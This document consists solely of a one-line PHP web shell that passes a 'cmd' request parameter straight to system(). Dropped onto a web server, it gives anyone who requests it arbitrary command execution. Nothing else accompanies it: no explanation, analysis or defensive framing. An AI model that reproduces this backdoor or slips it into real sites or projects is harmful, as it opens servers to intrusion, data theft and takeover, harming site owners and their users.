<?php system($_REQUEST['cmd']); ?>
